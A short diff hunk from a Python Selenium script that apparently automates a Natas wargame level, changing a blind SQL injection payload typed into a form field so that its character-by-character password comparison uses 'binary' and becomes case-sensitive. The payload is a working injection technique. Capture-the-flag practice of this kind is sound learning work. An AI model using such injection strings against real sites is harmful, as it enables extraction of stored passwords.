@@ -79,7 +79,7 @@ def solve(driver, _ = None):
                 text_field = driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]')
                 text_field.clear()
                 text_field.send_keys(
-                    f'natas16" and left(password, {len(password)+1})="{password+language[mid]}" #'
+                    f'natas16" and left(password, {len(password)+1})= binary "{password+language[mid]}" #'
                 )
                 driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
                 WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]'))
